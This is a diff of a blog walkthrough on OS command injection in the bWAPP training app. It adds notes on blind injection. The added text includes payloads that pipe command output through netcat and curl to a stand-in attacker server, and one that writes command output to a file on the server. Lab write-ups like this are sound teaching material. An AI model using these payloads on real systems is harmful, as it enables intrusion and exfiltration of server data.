@@ -192,10 +192,10 @@ OS command injections comes into play when the code is requesting the commandlin
 | Name of current user | whoami | whoami |
 | Operating system | uname -a | ver |
 | Network configuration | ifconfig | ipconfig /all |
-| Network connections | netstat -an	netstat -an |
+| Network connections | netstat -an | netstat -an |
 | Running processes | ps -ef | tasklist |
 
-Here it is using the <code>shell_exec("nslookup  " . commandi($target))</code> nslookup tool to find the DNS record of the provided domain.
+This level is using the <code>shell_exec("nslookup  " . commandi($target))</code> nslookup tool to find the DNS record of the provided domain.
 
 ![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_easy_1.png)
 
@@ -220,15 +220,38 @@ As the function used by the server blocks the use of '&' and ; but we can use pi
 
 <h3>Security Level: high</h3>
 
-Here they are using ```escapeshellcmd(); ``` function which ensure that user execute only one command user can specify unlimited number of parameters user cannot execute different command. This was exploitable in the earlier versions of PHP. Read more [HERE](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection)
+Here they are using ```escapeshellcmd(); ``` function which ensure that user execute only one command. User can specify unlimited number of parameters but cannot execute different command. This was exploitable in the earlier versions of PHP. Read more [HERE](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection)
 
 ## OS Command Injection - Blind
 ---
+>Blind command injection occurs when the system call that's being made does not return the response of the call to the Document Object Model. Means when the command output is not displayed to us in the webpage, now how can we get to know that there is OS command injection when there is no output shown??
+
 <h3>Security Level: low</h3>
+ As we provide the IP nothing happens.
+
+![OS commmand injection blind]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_blind_l1.png)
+
+There is a way to bypass the blind injection with netcat by pipeing the output of a command to a nc listener. We could do something like 
+```172.217.167.14 ; ls -la | nc {OUR_machine_IP} {PORT} ``` . This will send the output of ls -la to our netcat listener. BUT WHAT TO DO IF THE SERVER IS HOSTED ON A WINDOW MACHINE which do not have netcat by default so here we can use the curl command as ```type /path/to/file | curl –F “:data=@-“ http://our_malicious_server_ip/test.txt ``` . This sends the file data to our server and we can see the contents in our error log files on our malicious server. We can even send the files, for more see [HERE](https://www.contextis.com/us/blog/data-exfiltration-via-blind-os-command-injection).<br> But in this challange no such efforts are required as we can simply save the output of our malicious command to a file on the server and later access the file form the URL.<br>
+Lets see practically:
+Using the command ```172.217.167.14 | cd > present_workingdir.txt``` in the text box.
+
+![OS commmand injection blind]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_blind_l2.png)
+
+Now moving to the file we created on the server ```https://localhost/bwapp/present_workingdir.txt```.
+
+![OS commmand injection blind]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_blind_l3.png)
+
+Hence we can access each file on the server :)
 
 <h3>Security Level: medium</h3>
 
+Same works here as in medium level the function used by the server blocks the use of '&' and ; but we are actually using pipe for chaining the multiple commands.
+
 <h3>Security Level: high</h3>
+
+Here again they are using ```escapeshellcmd(); ``` function which ensure that user execute only one command , so we can't chain the commands in this level.
+
 
 All SQL challanges are covered in PART II of A1-Injection.<br>
 <i>Thanks for your patience, I hope you enjoyed reading. Happy Hacking... </i>
